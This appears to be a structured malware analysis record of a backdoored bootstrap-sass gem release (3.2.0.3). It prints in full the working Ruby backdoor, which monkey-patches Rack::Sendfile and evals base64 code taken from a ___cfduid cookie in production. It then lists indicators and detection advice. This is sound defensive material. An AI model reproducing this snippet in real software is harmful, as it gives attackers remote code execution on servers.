package_info.why_malicious: Version 3.2.0.3 of bootstrap-sass introduces a malicious file (lib/active-controller/middleware.rb) that backdoors the application by monkey-patching Rack::Sendfile middleware. This code enables remote code execution by evaluating attacker-supplied, base64-encoded Ruby code from a specially crafted HTTP cookie (___cfduid), allowing attackers to execute arbitrary commands on any server running the affected version. This represents a critical compromise of server integrity and security.

execution_context.trigger: import-time (when the gem is loaded in a Rails application, specifically in production environments)

malicious_snippets.code_snippet:
begin
 require 'rack/sendfile'
 if Rails.env.production?
   Rack::Sendfile.tap do |r|
     r.send :alias_method, :c, :call
     r.send(:define_method, :call) do |e|
       begin
         x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
         eval(x) if x
       rescue Exception
       end
       c(e)
     end
   end
 end
rescue Exception
 nil
end
malicious_snippets.code_behavior: At import-time in production environments, the code monkey-patches the Rack::Sendfile middleware's call method, extracts the ___cfduid cookie from each HTTP request, base64-decodes its value, and evaluates it as Ruby code, resulting in remote code execution by anyone able to control the cookie.

malice_analysis.why_suspicious: The code dynamically redefines a core middleware method to execute arbitrary Ruby code supplied by a client via an HTTP cookie. This is a textbook backdoor technique, as it allows attackers to inject and run any code on the server without authentication.
malice_analysis.violated_expectations: Legitimate middleware should never execute code from user-supplied cookies or redefine core methods at runtime. The expected behavior is to securely process HTTP requests, not to introduce dynamic code execution paths based on untrusted input.
malice_analysis.similar_legitimate_use: Monkey-patching is sometimes used in Ruby for bug fixes or instrumentation, but it is never acceptable to use it for executing user-supplied code from cookies. No legitimate use case exists for this pattern in production middleware.
key_indicators: Monkey-patching of Rack::Sendfile's call method at import-time
Extraction and base64-decoding of the ___cfduid cookie from HTTP requests
Use of eval to execute decoded cookie data as Ruby code
Conditional execution restricted to production environment (Rails.env.production?)
Silent exception handling to suppress errors and avoid detection

attack_chain.action: Malicious code is loaded when the gem is imported in a Rails application running in production, due to the presence of the malicious file.
attack_chain.leads_to: The Rack::Sendfile middleware is monkey-patched to intercept and modify HTTP request handling.

attack_chain.action: For each incoming HTTP request, the modified call method checks for the ___cfduid cookie, base64-decodes its value, and evaluates it as Ruby code.
attack_chain.leads_to: An attacker can send specially crafted cookies to execute arbitrary code on the server.

attack_chain.action: The attacker achieves remote code execution on the server, enabling persistent and stealthy access and potential full system compromise.
attack_chain.leads_to: Final goal: persistent, stealthy remote access and control of the compromised server.

behavioral_signatures: Monkey-patching of core middleware methods, specifically Rack::Sendfile#call, at import-time
Use of eval on data extracted from HTTP cookies within middleware
Base64 decoding of cookie values immediately before code execution
Silent exception handling (rescue Exception) around dynamic code execution in middleware
file_indicators: Presence of lib/active-controller/middleware.rb (file does not exist in legitimate versions of bootstrap-sass)
Code that redefines or monkey-patches Rack::Sendfile#call in any gem or application file
network_indicators: Inbound HTTP requests containing ___cfduid cookies with base64-encoded payloads
Unusual or malformed ___cfduid cookies in HTTP requests to Rails applications using bootstrap-sass 3.2.0.3

Analyze code for monkey-patching of Rack::Sendfile and the use of eval on base64-decoded cookie data. Monitor HTTP traffic for ___cfduid cookies containing base64-encoded payloads. Alert on any code that executes user-supplied data from cookies, especially in production environments. Flag any silent exception handling around dynamic code execution in middleware.
